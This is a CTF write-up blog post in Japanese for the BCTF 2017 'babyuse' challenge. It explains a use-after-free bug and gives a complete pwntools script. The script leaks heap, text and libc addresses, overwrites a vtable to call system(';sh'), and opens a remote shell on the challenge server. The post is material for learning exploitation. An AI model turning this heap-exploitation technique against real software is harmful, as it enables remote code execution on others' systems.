---
layout: post
redirect_from:
  - /writeup/ctf/2017/bctf-2017-babyuse/
  - /blog/2017/04/22/bctf-2017-babyuse/
date: "2017-04-22T01:14:03+09:00"
tags: [ "ctf", "writeup", "bctf", "pwn", "heap", "use-after-free" ]
---

# BCTF 2017: babyuse

それほど難しくはないはずだが、無限に時間がかかってしまった。

## problem

```
$ ./babyuse
 _                                         
|_)_. _ _o _ ._  |  _  _. _| _  /\ ._ _    
| (_|_>_>|(_)| | |_(/_(_|(_|_> /--\| | |\/ 
                                        /  

Menu:
1. Buy a Gun
2. Select a Gun
3. List Guns
4. Rename a Gun
5. Use a Gun
6. Drop a Gun
7. Exit
1
Notice: You can only have up to 4 guns.
Choose a gun to add:
1. QSZ92
2. QBZ95
1
Lenth of name：
4
Input name:
foo
succeed.
Menu:
1. Buy a Gun
2. Select a Gun
3. List Guns
4. Rename a Gun
5. Use a Gun
6. Drop a Gun
7. Exit
5
Select gun foo
1. Shoot
2. Reload
3. Info
4. Main menu
1
BIU~
1
BIU~
1
BIU~
1
BIU~

```

## solution

use-after-free bugがある。
double-freeはできない。
PIE。

-   heapの位置は、heap chunk内のmember `fd` `bk`のあたりから取る
-   これを使って構造体の`vtable`を読んでtextの位置を割り出す
-   GOT中の`stdin`とかからlibcを割り出す
-   `vtable`を書き換えて`system("hoge;sh");`

## implementation

``` python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import itertools
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='202.112.51.247')
parser.add_argument('port', nargs='?', default=3456, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='babyuse')
parser.add_argument('--libc', default='libc.so')
parser.add_argument('--token')
args = parser.parse_args()
context.log_level = args.log_level
elf = ELF(args.binary)
libc = ELF(args.libc)

p = remote(args.host, args.port)
if args.token:
    p.recvuntil('Token:')
    p.sendline(args.token)

# buy gun 0
p.recvuntil('Menu:')
p.sendline('1') # Buy a Gun
p.recvuntil('Choose a gun to add:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('4')
p.recvuntil('Input name:')
p.sendline('AAAA')
# buy gun 1
p.recvuntil('Menu:')
p.sendline('1') # Buy a Gun
p.recvuntil('Choose a gun to add:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('4')
p.recvuntil('Input name:')
p.sendline('BBBB')
# select gun 1
p.recvuntil('Menu:')
p.sendline('2') # Select a Gun
p.recvuntil('Select a gun')
p.sendline('1')
# drop gun 0
p.recvuntil('Menu:')
p.sendline('6') # Drop a Gun
p.recvuntil('Choose a gun to delete:')
p.sendline('0')
# drop gun 1
p.recvuntil('Menu:')
p.sendline('6') # Drop a Gun
p.recvuntil('Choose a gun to delete:')
p.sendline('1')
# use the gun
p.recvuntil('Menu:')
p.sendline('5') # Use a Gun
p.recvuntil('Select gun ')
heap_addr = u32(p.recvn(4)) # read heap addr from a link of a chunk header
p.sendline('4') # Main menu
log.info('heap: %#x', heap_addr)

# buy gun 0
p.recvuntil('Menu:')
p.sendline('1') # Buy a Gun
p.recvuntil('Choose a gun to add:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('4')
p.recvuntil('Input name:')
p.sendline('AAAA')
# buy gun 1
p.recvuntil('Menu:')
p.sendline('1') # Buy a Gun
p.recvuntil('Choose a gun to add:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('4')
p.recvuntil('Input name:')
p.sendline('BBBB')
# buy gun 2
p.recvuntil('Menu:')
p.sendline('1') # Buy a Gun
p.recvuntil('Choose a gun to add:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('4')
p.recvuntil('Input name:')
p.sendline('CCCC')
# select gun 0
p.recvuntil('Menu:')
p.sendline('2') # Select a Gun
p.recvuntil('Select a gun')
p.sendline('0')
# drop gun 0
p.recvuntil('Menu:')
p.sendline('6') # Drop a Gun
p.recvuntil('Choose a gun to delete:')
p.sendline('0')
# rename gun 1
p.recvuntil('Menu:')
p.sendline('4') # Drop a Gun
p.recvuntil('Choose a gun to rename:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('16') # sizeof(gun_t)
p.recvuntil('Input name:')
p.sendline('AAAA' + p32(heap_addr + 64))
# use the gun
p.recvuntil('Menu:')
p.sendline('5') # Use a Gun
p.recvuntil('Select gun ')
text_addr = u32(p.recvn(4)) # read vtable
p.sendline('4') # Main menu
log.info('text: %#x', text_addr)

# rename gun 1
p.recvuntil('Menu:')
p.sendline('4') # Drop a Gun
p.recvuntil('Choose a gun to rename:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('4')
p.recvuntil('Input name:')
p.sendline('BBBB')
# rename gun 1
p.recvuntil('Menu:')
p.sendline('4') # Drop a Gun
p.recvuntil('Choose a gun to rename:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('16') # sizeof(gun_t)
p.recvuntil('Input name:')
p.sendline('AAAA' + p32(text_addr + 9040))
# use the gun
p.recvuntil('Menu:')
p.sendline('5') # Use a Gun
p.recvuntil('Select gun ')
libc_addr = u32(p.recvn(4)) # read got
p.sendline('4') # Main menu
log.info('libc: %#x', libc_addr)

# rename gun 1
p.recvuntil('Menu:')
p.sendline('4') # Drop a Gun
p.recvuntil('Choose a gun to rename:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('4')
p.recvuntil('Input name:')
p.sendline('BBBB')
# rename gun 1
p.recvuntil('Menu:')
p.sendline('4') # Drop a Gun
p.recvuntil('Choose a gun to rename:')
p.sendline('1')
p.recvuntil('Lenth of name：')
p.sendline('16') # sizeof(gun_t)
p.recvuntil('Input name:')
payload = ''
payload += p32(heap_addr + 36)
payload += p32(heap_addr + 36)
payload += ';sh\0'
payload += p32(libc_addr - 1538048) # system
p.sendline(payload)
# use the gun
p.recvuntil('Menu:')
p.sendline('5') # Use a Gun
p.recvuntil('Select gun ')
p.sendline('1') # Shoot

# done
time.sleep(1)
p.sendline('id')
p.interactive()
```
